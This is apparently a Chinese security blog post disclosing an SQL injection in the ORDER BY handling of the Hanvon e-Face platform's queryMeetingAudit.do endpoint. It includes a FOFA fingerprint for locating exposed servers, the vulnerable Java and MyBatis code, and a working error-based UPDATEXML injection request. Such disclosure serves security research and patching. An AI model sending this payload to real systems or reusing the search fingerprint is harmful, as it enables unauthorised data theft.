---
title: "汉王e脸通综合管理平台 queryMeetingAudit.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryMeetingAudit-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymeetingaudit.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryMeetingAudit.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/4 08:23
- 514浏览
- [0评论](#comment)
- 50分钟阅读

深入探索

防火墙软件

Windows安全工具

VPN服务

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingAudit.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

JSON处理工具

网络安全培训

授权

直接看 `MobiMeetingAppController` 里关于 `queryMeetingAudit` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryMeetingAudit.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult queryMeetingAudit(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "keys") String keys, @RequestParam(required = false,value = "auditState") Integer auditState, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingParam meetingParam = new MeetingParam();
                meetingParam.setKeys(keys);
                meetingParam.setMtStartTime(start);
                meetingParam.setMtEndTime(end);
                if (auditState != null) {
                    meetingParam.setState(auditState);
                }

                meetingParam.setColumnKey(columnKey);
                meetingParam.setOrder(order);
                if (start == null) {
                    meetingParam.setMtDate(DateUtils.formatDate(DateUtils.getDate()));
                }

                PageHelper.startPage(page, pageSize);
                List<MeetingTpm> list = this.meetingAsm.queryMeetingAudit(meetingParam);
```

深入探索

恶意软件分析工具

SQL注入防护

Docker加速服务

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingDsm.xml

代码安全审计

```
<!--查询会议预约审核列表-->
    <select id="queryMeetingAudit" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingParam"
            resultMap="ResultMapVO">
        SELECT MT.ID,MT.MT_NAME,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_SIGNIN_STARTTIME,
        MT.MT_SIGNIN_ENDTIME,MT.MR_ID,MT.MT_CONTENT,MT.MT_DELETE,MT.MT_STATE,MT.MT_CREATE_TIME,MT_IS_SIGNIN,MT_IS_SIGNOUT,
        MT.MT_DEVICE_ID,MT.MT_SIGNOUT_STARTTIME,MT.MT_SIGNOUT_ENDTIME,SU.SZ_NAME as applicant,sb.sz_name as branchName,
        MMT.MR_NAME AS MRNAME,(SELECT COUNT(1) FROM mt_meeting_file MMF WHERE MMF.MT_ID = MT.ID) AS SUM
        FROM mt_meeting MT
        LEFT JOIN mt_meeting_room MMT ON MT.MR_ID = MMT.ID
        LEFT JOIN sys_user_sys SU ON MT.MT_CREATE_ID = SU.NG_ID
        LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id
        =MT.MT_CREATE_ID )
        WHERE MT.MT_DELETE = 1 AND  MT.MT_STATE &lt;&gt; 1
        <if test="keys != null">
            AND (
            SU.SZ_NAME like CONCAT('%',#{keys},'%')
            OR SU.sz_employ_id =#{keys}
            )
        </if>
        <if test="state != null and state != ''">
            AND MT.MT_STATE= #{state}
        </if>
        <if test="mtName != null and mtName != ''">
            AND MT.MT_NAME like CONCAT('%',#{mtName},'%')
        </if>
        <if test="mtStartTime != null">
            AND DATE(MT.MT_DATE) &gt;= DATE(#{mtStartTime,jdbcType=VARCHAR})
        </if>
        <if test="mtEndTime != null">
            AND DATE(#{mtEndTime,jdbcType=VARCHAR}) &gt;= DATE(MT.MT_DATE)
        </if>
        <if test="mrId != null">
            and MT.MR_ID = #{mrId}
        </if>
        <if test="mtDate != null">
            and MT.MT_DATE &gt;= #{mtDate,jdbcType=VARCHAR}
        </if>
        ORDER BY
        <if test="order == null or order == ''">
            MT.MT_CREATE_TIME desc
        </if>
        <if test="order != null and order != ''">
            ${columnKey} ${order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
GET /manage/mobiMeetingApp/queryMeetingAudit.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 queryMeetingAudit.do SQL注入漏洞](images/img-001-5b9109bb7499.webp)](https://image.mrxn.net/d40c4e77b9ce4497b889b7d4e71c11f9.webp)

成功通过报错注入爆出数据库版本信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
